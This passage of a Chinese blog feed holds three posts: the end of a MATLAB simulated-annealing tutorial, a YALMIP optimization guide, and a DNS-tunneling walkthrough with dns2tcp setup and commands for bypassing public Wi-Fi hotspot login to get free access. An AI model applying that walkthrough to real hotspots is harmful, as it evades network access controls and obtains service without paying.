class="number">1</span>:n<span class="number">-1</span></span><br><span class="line">        len=len+graph(city(<span class="built_in">i</span>),city(<span class="built_in">i</span>+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    len=len+graph(city(n),city(<span class="number">1</span>));</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></li><li><p>接着,根据旧解产生新解的函数.文件<code>perturbTour.m</code>.</p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">city</span>=<span class="title">perturbTour</span><span class="params">(city)</span></span></span><br><span class="line">    <span class="comment">%随机置换两个不同的城市的坐标</span></span><br><span class="line">    <span class="comment">%产生随机扰动</span></span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    p1=randi([<span class="number">1</span>,n]);</span><br><span class="line">    p2=randi([<span class="number">1</span>,n]);</span><br><span class="line">    tmp=city(p1);</span><br><span class="line">    city(p1)=city(p2);</span><br><span class="line">    city(p2)=tmp;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></li><li><p>最后,调用模拟退火函数(与第一步写在同一文件),并运行.文件<code>main.m</code></p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[city,res]=EzSA(city,@computerTour,@perturbTour)</span><br></pre></td></tr></table></figure></li></ul><p>结果:<br>    <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">city =</span><br><span class="line">    <span class="number">4</span>     <span class="number">1</span>     <span class="number">3</span>     <span class="number">2</span>     <span class="number">5</span></span><br><span class="line">res =</span><br><span class="line">    <span class="number">20</span></span><br></pre></td></tr></table></figure></p><h1 id="原理讲解"><a href="#原理讲解" class="headerlink" title="原理讲解"></a>原理讲解</h1><p>源代码:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">[X resEnd]</span>=<span class="title">EzSA</span><span class="params">(X,ObjFun,ArriseNew,iter,zero)</span></span></span><br><span class="line">    [ra,co]=<span class="built_in">size</span>(X);</span><br><span class="line">    RES=[ObjFun(X)];  <span class="comment">%每次迭代后的结果</span></span><br><span class="line">    temperature=<span class="number">100</span>*co;      <span class="comment">%初始温度</span></span><br><span class="line">    <span class="keyword">if</span> nargin==<span class="number">3</span></span><br><span class="line">        zero=<span class="number">1e-2</span>;</span><br><span class="line">        iter=<span class="number">5e2</span>;               <span class="comment">%内部蒙特卡洛循环迭代次数</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> nargin==<span class="number">4</span></span><br><span class="line">        zero=<span class="number">1e-2</span>;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    h=waitbar(<span class="number">0</span>,<span class="string">'SAing....'</span>);</span><br><span class="line">    <span class="keyword">while</span> temperature&gt;zero    <span class="comment">%停止迭代温度</span></span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:iter     <span class="comment">%多次迭代扰动，一种蒙特卡洛方法，温度降低之前多次实验</span></span><br><span class="line">            preRes=ObjFun(X);         <span class="comment">%目标函数计算结果</span></span><br><span class="line">            tmpX=ArriseNew(X);      <span class="comment">%产生随机扰动</span></span><br><span class="line">            newRes=ObjFun(tmpX);     <span class="comment">%计算新结果</span></span><br><span class="line"></span><br><span class="line">            delta_e=newRes-preRes;  <span class="comment">%新老结果的差值，相当于能量</span></span><br><span class="line">            <span class="keyword">if</span> delta_e&lt;<span class="number">0</span>        <span class="comment">%新结果好于旧结果，用新路线代替旧路线</span></span><br><span class="line">                X=tmpX;</span><br><span class="line">            <span class="keyword">else</span>                        <span class="comment">%温度越低，越不太可能接受新解；新老距离差值越大，越不太可能接受新解</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">exp</span>(-delta_e/temperature)&gt;<span class="built_in">rand</span>() <span class="comment">%以概率选择是否接受新解 p=exp(-ΔE/T)</span></span><br><span class="line">                    X=tmpX;      <span class="comment">%可能得到较差的解</span></span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        RES=[RES ObjFun(X)];</span><br><span class="line">        temperature=temperature*<span class="number">0.99</span>;   <span class="comment">%温度不断下降</span></span><br><span class="line">        waitbar((<span class="built_in">log</span>(temperature/(<span class="number">100</span>*co))/<span class="built_in">log</span>(<span class="number">0.99</span>))/(<span class="built_in">log</span>(zero/(<span class="number">100</span>*co))/<span class="built_in">log</span>(<span class="number">0.99</span>)),h,sprintf(<span class="string">'Now Temperature:%.2f'</span>,temperature));</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    close(h)</span><br><span class="line">    <span class="built_in">plot</span>(RES);</span><br><span class="line">    resEnd=RES(<span class="keyword">end</span>);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>结合代码再看开头的流程图.</p><p>初始化,计算初始解的解值,设置初始温度.<br>模拟退火结构上就是两重循环,外部循环检查温度并降温,内部不断地产生新解并与旧解比较.</p><p>若新解优于旧解则新解无条件被旧解替代.<br>否则,有一定概率(<code>exp(-ΔE/T)</code>)新解取代旧解.<strong>注意这个环节正是模拟退火能跳脱局部最优解,取得全局最优解的关键</strong>.</p><p>由此,我们可以得知影响模拟退火效果的主要因素有:</p><ul><li>终止温度.一般上,终止温度越低,取得解越优.</li><li>内部迭代次数.一般上,内部迭代次数越多,取得解越优.</li><li>产生新解函数.</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>模拟退火是对热力学退火过程的模拟,使算法在多项式时间内能给出一个近似最优解.由于MATLAB自带的模拟退火工具箱调用复杂且执行效果不理想,本文给出了较简单的函数原型和调用方法.该算法也包含以下优缺点(个人见解):</p><p>优点:</p><ul><li>相较于一般的蒙特卡洛算法,有更少的尝试次数,同时实现上并不比蒙特卡洛花更多时间.</li><li>相较于遗传算法等大型智能算法,模拟退火实现简单,并能返回较满意的结果.</li><li>目标函数可以自己定制,相较于普通的规划解析器,模拟退火能适用于更广的范围(NPC问题,甚至给给神经网络做优化).</li><li>对于离散型的变量有更优秀的效果.</li></ul><p>缺点:</p><ul><li>内部本质上还是蒙特卡洛算法,新解与旧解本质上无关联.</li><li>相较于遗传算法,模拟退火难以控制算法的运行时间,EzSA的后面两个可选参数就是内部迭代次数和0度温度.而迭代次数给少了效果不理想,给多了有会增加等待时间.</li><li>对连续型的规划问题效果并不好.</li></ul><p>样例和函数原型下载:<br><a href="https://github.com/Anemone95/matlab-sa" target="_blank" rel="noopener">https://github.com/Anemone95/matlab-sa</a></p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>YALMIP工具箱——Matlab上解决规划问题的大杀器</title>
      <link href="/%E6%95%B0%E6%A8%A1-YALMIP%E5%B7%A5%E5%85%B7%E7%AE%B1%E2%80%94%E2%80%94Matlab%E4%B8%8A%E8%A7%A3%E5%86%B3%E8%A7%84%E5%88%92%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%A7%E6%9D%80%E5%99%A8/"/>
      <url>/%E6%95%B0%E6%A8%A1-YALMIP%E5%B7%A5%E5%85%B7%E7%AE%B1%E2%80%94%E2%80%94Matlab%E4%B8%8A%E8%A7%A3%E5%86%B3%E8%A7%84%E5%88%92%E9%97%AE%E9%A2%98%E7%9A%84%E5%A4%A7%E6%9D%80%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>数学建模过去很多年了，但是YALMIP工具箱的易用性仍然让我影响深刻，用过这个之后再想想现在用的z3约束求解真的是弱爆了，什么时候Python上面能有一个那么好用的规划工具就好了&gt;_&lt;</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>规划问题可以算是数模竞赛常见的问题(作为信工院的小白,实在佩服数科院的牛人们能把任何问题搞成优化问题).由于MATLAB自带的规划工具箱并不好用,部分同学不得不用Lingo等软件专门解决规划问题,但Lingo的语法可读性并没有matlab好.YALMIP解决了这个问题.</p><a id="more"></a><p>简单来说,YALMIP是一个MATLAB上的一个工具箱.它让你用MATLAB语法优雅地解决各种规化问题.(MATLAB的函数都能用，妈妈再也不用担心我的学习orz)</p><p>往细了说,它将优化问题进行分类,在底层通过B/S模式调用外部的各种解析器(每一解析器可以对应一类或多类问题,如Lingo的解析器Lindo就在其中),而在外部,你不需要了解各种解析器的具体语法,只需掌握YALMIP的语法就可轻松的调用他们.由此解决大多数规划问题.<br><img src="/数模-YALMIP工具箱——Matlab上解决规划问题的大杀器/yal.png" alt="yal"></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ol><li><p>确保MATLAB版本在2015a及以上.</p></li><li><p><a href="http://www.control.isy.liu.se/~johanl/YALMIP.zip" target="_blank" rel="noopener">点击此处</a>下载zip安装包,随后解压到MATLAB目录下,如果你的MATLAB安装在默认目录下,那么结果如下:</p></li></ol><p><img src="/数模-YALMIP工具箱——Matlab上解决规划问题的大杀器/path.png" alt="path"></p><ol><li>将YALMIP的目录加入到MATLAB的PATH中,其中包括:</li></ol><p><img src="/数模-YALMIP工具箱——Matlab上解决规划问题的大杀器/addPath.jpg" alt="addPath"></p><ol><li><p>验证YALMIP的安装工作</p><p> 在MATLAB中输入<code>yalmiptest</code>,若出现</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">|       Searching <span class="keyword">for</span> installed solvers       |</span><br><span class="line">+++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">|        Solver|   Version/module|      Status|</span><br><span class="line">+++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line">|       LINPROG|                 |       found|</span><br><span class="line">|      QUADPROG|                 |       found|</span><br><span class="line">|        LMILAB|                 |       found|</span><br><span class="line">|       FMINCON|        geometric|       found|</span><br><span class="line">|                .......                      |</span><br><span class="line">|         FRLIB|                 |   not found|</span><br><span class="line">+++++++++++++++++++++++++++++++++++++++++++++++</span><br></pre></td></tr></table></figure><p> 那么恭喜你,YALMIP安装成功!</p></li><li><p>安装基础的解析器<br> 细心的朋友应该发现了,当我们执行<code>yalmiptest</code>时,实际上是检查可使用的解析器.下面就介绍一些常用的解析器以及安装</p><p> Gurobi/CPLEX:Gurobi和CPLEX适用的范围差不多,所以上只要装一个就行.性能的话还是CPLEX会好一点(毕竟IBM,但差别不大),两者都有针对学术的免费版本,CPLEX学术版本的获取需要以教师身份注册,而Gurobi是需要教育网IP验证.同时Gurobi还有免费的社区版本(半年).各版本的区别都在于支持的变量数上,然而Gurobi的社区版本个人以为完全可以满足国赛的需要了(超了那个数量自己想想思路有没有问题).</p><p> 以下是Gurobi的安装流程.</p><ol><li>先到<a href="http://www.gurobi.com/" target="_blank" rel="noopener">Gurobi</a>官网上注册账号.</li><li>申请对应版本的序列号.</li><li>下载对应版本<a href="http://user.gurobi.com/download/gurobi-optimizer" target="_blank" rel="noopener">Gurobi</a>,安装后重启.</li><li>Win+R运行cmd回车后 输入激活码<code>grbgetkey xxx-xxx-xxx-xxx</code>.</li><li>在MATLAB下运行Gurobi/win/matlab/gurobi_setup.m 同时保存PATH<code>savepath</code></li><li><p>在运行<code>yalmiptest</code>应该看到Gurobi变成found了.</p><p>当然,如果你确实需要一个支持大量变量的解析器,那么你只能用mosek了,只需要edu邮箱验证,然而解题速度会慢很多.</p></li></ol></li></ol><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><ol><li><p>设未知量</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x = sdpvar(n,m); <span class="comment">%生成a行b列的未知量</span></span><br></pre></td></tr></table></figure><p> 之前也说过YALMIP的未知量有3中类型.分别为</p><ul><li>sdpvar %实型</li><li>intvar %整型</li><li>binvar %0-1型<br>需要混合规划多设几个变量就行了</li></ul></li><li><p>约束条件, 例如:</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F = [<span class="number">-2</span> &lt;= x &lt;= <span class="number">2</span>];</span><br></pre></td></tr></table></figure></li><li><p>写目标函数</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj = x(<span class="number">1</span>)^<span class="number">2</span>+x(<span class="number">2</span>)^<span class="number">2</span>;</span><br></pre></td></tr></table></figure></li><li><p>求解</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">optimize(F,obj[,options]);</span><br></pre></td></tr></table></figure><p> F为约束,obj为目标函数(默认求最小值),options可选择求解器,改变输出方式,如:</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">optimize(F,obj,sdpsettings(<span class="string">'solver'</span>,<span class="string">'gurobi'</span>,<span class="string">'verbose'</span>,<span class="number">2</span>));</span><br></pre></td></tr></table></figure><p> 指定solver为Gurobi,不打印解析过程.</p></li><li>获取结果 <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opt=value(x); <span class="comment">%x的值</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="具体案例"><a href="#具体案例" class="headerlink" title="具体案例"></a>具体案例</h1><h2 id="案例一-求-x-2-y-2在x-y∈-2-2-上的最小值"><a href="#案例一-求-x-2-y-2在x-y∈-2-2-上的最小值" class="headerlink" title="案例一:求 x^2+y^2在x,y∈[-2,2]上的最小值"></a>案例一:求 x^2+y^2在x,y∈[-2,2]上的最小值</h2><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%生成2*1的矩阵变量</span></span><br><span class="line">x = sdpvar(<span class="number">2</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">%限制条件</span></span><br><span class="line">F = [<span class="number">-2</span> &lt;= x &lt;= <span class="number">2</span>];</span><br><span class="line"><span class="comment">%目标函数</span></span><br><span class="line">obj = x(<span class="number">1</span>)^<span class="number">2</span>+x(<span class="number">2</span>)^<span class="number">2</span>;</span><br><span class="line"><span class="comment">%求解</span></span><br><span class="line">optimize(F,obj);</span><br><span class="line"><span class="comment">%取得值以及对应的x的值</span></span><br><span class="line">optobj = value(obj)</span><br><span class="line">optx = value(x)</span><br></pre></td></tr></table></figure><p>结果如下(我的gurobi过期了,以下为MATLAB自带求解器结果)<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">optobj =</span><br><span class="line">   <span class="number">1.5449e-43</span></span><br><span class="line">optx =</span><br><span class="line">   <span class="number">1.0e-21</span> *</span><br><span class="line">    <span class="number">0.2779</span>    <span class="number">0.2779</span></span><br></pre></td></tr></table></figure></p><h2 id="案例二-指派问题-A-B-C为3个员工-P-Q-R为3样工作-成本表如下"><a href="#案例二-指派问题-A-B-C为3个员工-P-Q-R为3样工作-成本表如下" class="headerlink" title="案例二:指派问题,A,B,C为3个员工,P,Q,R为3样工作,成本表如下:"></a>案例二:指派问题,A,B,C为3个员工,P,Q,R为3样工作,成本表如下:</h2><div class="table-container"><table><thead><tr><th></th><th>A</th><th>B</th><th>C</th></tr></thead><tbody><tr><td>P</td><td>9</td><td>6</td><td>2</td></tr><tr><td>Q</td><td>3</td><td>1</td><td>4</td></tr><tr><td>R</td><td>5</td><td>6</td><td>10</td></tr></tbody></table></div><p>代码:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%设x(a,b)==1为a做b工作</span></span><br><span class="line">x=binvar(<span class="number">3</span>,<span class="number">3</span>);</span><br><span class="line"><span class="comment">%成本矩阵</span></span><br><span class="line">work=[<span class="number">9</span>,<span class="number">6</span>,<span class="number">2</span>;<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>;<span class="number">5</span>,<span class="number">6</span>,<span class="number">10</span>];</span><br><span class="line"><span class="comment">%限制条件,每人只能做一份工作</span></span><br><span class="line">F=[sum(x)==<span class="number">1</span>];</span><br><span class="line"><span class="comment">%目标函数,总花费最小</span></span><br><span class="line">obj=sum(sum(x.*work));</span><br><span class="line"><span class="comment">%启动求解器</span></span><br><span class="line">optimize(F,obj);</span><br><span class="line"><span class="comment">%获取结果</span></span><br><span class="line">optx=value(x)</span><br><span class="line">optObj=value(obj)</span><br></pre></td></tr></table></figure></p><p>结果如下:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">optx =</span><br><span class="line"> <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line"> <span class="number">0</span>     <span class="number">1</span>     <span class="number">0</span></span><br><span class="line"> <span class="number">1</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line"></span><br><span class="line">optObj =</span><br><span class="line"> <span class="number">8</span></span><br></pre></td></tr></table></figure></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>YALMIP让我们用MATLAB语言方便地调用专业的求解器,而借助于MATLAB自带的一些函数,我们可以更容易的解决各种规划问题.</p><p>但有一点需要注意,MATLAB的语法虽好用,但也不是所有函数都可以与YALMIP结合,例如神经网络,模拟退火的函数是不可以当做限制函数或限制条件参与规划的.</p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 规划 </tag>
            
            <tag> 约束求解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS隧道——绕过公共 Wifi 热点登陆免费上网</title>
      <link href="/%E7%BD%91%E7%BB%9C%E5%B1%82-DNS%E9%9A%A7%E9%81%93%E2%80%94%E2%80%94%E7%BB%95%E8%BF%87%E5%85%AC%E5%85%B1-Wifi-%E7%83%AD%E7%82%B9%E7%99%BB%E9%99%86%E5%AE%9E%E7%8E%B0%E5%85%8D%E8%B4%B9%E4%B8%8A%E7%BD%91/"/>
      <url>/%E7%BD%91%E7%BB%9C%E5%B1%82-DNS%E9%9A%A7%E9%81%93%E2%80%94%E2%80%94%E7%BB%95%E8%BF%87%E5%85%AC%E5%85%B1-Wifi-%E7%83%AD%E7%82%B9%E7%99%BB%E9%99%86%E5%AE%9E%E7%8E%B0%E5%85%8D%E8%B4%B9%E4%B8%8A%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<p><strong>声明：此方法仅供学习交流，严禁用于非法用途，否则后果自负！！！</strong></p><p>这是一个15年的博文了，因为这两年DNS带外数据的研究比较火，因此将此文从旧的博客搬运来。</p><h1 id="DNS隧道实现原理"><a href="#DNS隧道实现原理" class="headerlink" title="DNS隧道实现原理"></a>DNS隧道实现原理</h1><p>常见的热点都需要登录才能够上网, 而提供热点的ISP对热点的DNS查询服务并不作限制, 这样我们就可以在利用DNS查询机制传递信息.</p><a id="more"></a><p>也就是说, 如果我们的请求数据包中的数据, 不含过滤规则时, 有限制的ISP或者防火墙则不会进行丢包处理.</p><p>所以, 我们在发起请求时, 将请求数据包内容通过标准的DNS协议进行加密, 标记解析请求的DNS地址, 则有限制的ISP在解析客户端发起的域名请求时, 无法识别地址, 而去指定的DNS服务器上进行请求查询. 此时, 我们在指定的DNS服务器上进行数据包解密.</p><p>再将查询内容返回. 此时, 有限制的ISP或者防火墙会再次检测内容是否为非认证状态, 如果是非认证状态, 则将查询结果内容进行丢包处理.</p><p>所以, 在特定的DNS服务器上, 我们需要将结果进行标准DNS协议加密返回客户端. 此时ISP无法识别结果, 而直接返回客户端进行解密处理. 这样我们就完成了一次DNS隧道请求, 而完全绕过的ISP服务商的认证.</p><h1 id="建立DNS隧道的环境需求"><a href="#建立DNS隧道的环境需求" class="headerlink" title="建立DNS隧道的环境需求"></a>建立DNS隧道的环境需求</h1><ol><li>可以连接有限制的ISP服务商, 比如连接CMCC的无线热点</li><li>需要一台拥有公网IP的服务器</li><li>DNS隧道工具, 用来提供客户端, 服务器通信加解密操作, 以下总结几个流行的工具:<ul><li>tcp-over-dns <a href="http://analogbit.com/software/tcp-over-dns/" target="_blank" rel="noopener">http://analogbit.com/software/tcp-over-dns/</a></li><li>dns2tcp <a href="http://www.hsc.fr/ressources/outils/dns2tcp/" target="_blank" rel="noopener">http://www.hsc.fr/ressources/outils/dns2tcp/</a></li><li>iodine <a href="http://code.kryo.se/iodine/" target="_blank" rel="noopener">http://code.kryo.se/iodine/</a></li></ul></li><li>客户端代理工具</li></ol><h1 id="实战操作"><a href="#实战操作" class="headerlink" title="实战操作"></a>实战操作</h1><p>本次配置的服务器环境为 CentOS:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@iZ28hcmbsi9Z ~]# cat /etc/issue</span><br><span class="line">CentOS release 6.3 (Final)</span><br><span class="line">Kernel \r on an \m</span><br></pre></td></tr></table></figure><h2 id="为服务器添加A记录和NS记录"><a href="#为服务器添加A记录和NS记录" class="headerlink" title="为服务器添加A记录和NS记录"></a>为服务器添加A记录和NS记录</h2><blockquote><p>a.abc.xyz NS b.abc.xyz<br>b.abc.xyz A 1.2.3.4 (填你的服务器IP, 这里用 1.2.3.4 为例)</p></blockquote><h2 id="配置DNS工具服务端"><a href="#配置DNS工具服务端" class="headerlink" title="配置DNS工具服务端"></a>配置DNS工具服务端</h2><p>这里我们选用 DNS2TCP 为例<br>在服务器上安装 DNS2TCP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.hsc.fr/ressources/outils/dns2tcp/download/dns2tcp-0.5.2.tar.gz</span><br><span class="line">tar zxf dns2tcp-0.5.2.tar.gz</span><br><span class="line">cd dns2tcp-0.5.2</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>在 /etc 建立一个名为 dns2tcpd.conf 的文件, 然后输入以下配置:</p><blockquote><p>listen = 1.2.3.4（Linux服务器的IP）<br>port = 53<br>user = nobody<br>chroot = /tmp<br>domain = a.abc.xyz（上面配置NS记录的域名）<br>resources = ssh:127.0.0.1:22,socks:127.0.0.1:1082,http:127.0.0.1:3128</p></blockquote><p>最后的 resources 里面配置的是 dns2tcp 供客户端使用的资源。也就是说，这台服务器允许将22端口（ssh服务），1082端口（socks服务）和3128（http服务）转换成</p><p>服务端执行如下命令启动 dns2tcp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns2tcpd -f /etc/dns2tcpd.conf -F -d 2</span><br></pre></td></tr></table></figure><blockquote><p>-f 读取配置文件<br>-F 强制前台运行<br>-d 2 开启debug, 等级为2</p></blockquote><p><strong>到此为止,服务端配置完成</strong></p><h2 id="配置DNS工具客户端"><a href="#配置DNS工具客户端" class="headerlink" title="配置DNS工具客户端"></a>配置DNS工具客户端</h2><p>dns2tcp 的客户端配置较为简单, 一条命令就行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns2tcpc -r ssh -z a.abc.xyz 1.2.3.4 -l 8888 -d 2</span><br></pre></td></tr></table></figure><blockquote><p>-r 后接服务名称, 这里我们用ssh<br>-z 后接NS记录的网址, ip, <strong>注意IP地址最好写上, 可以不写</strong><br>-l 后接本地端口<br>-d 开启 Debug</p></blockquote><p>注意本地需要安装 dns2tcp 工具.</p><p><strong>到此为止, 服务端配置完成</strong></p><p>可以用SSH测试一下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@127.0.0.1:8888</span><br></pre></td></tr></table></figure><p>连通的话就说明 dns2tcp 成功了, 可以直接用SSH通道建立代理上网, 客户端 Chrome 再用 SwitchOmega 接入,也可以在客户端那写 http 或 Socks 服务, 前提是服务器那要有对应服务 (可以找 <em>Kingate 架设 http 和 Socks5 代理</em> 的文章)</p>]]></content>
      
      
      <categories>
          
          <category> 网络层安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS隧道 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
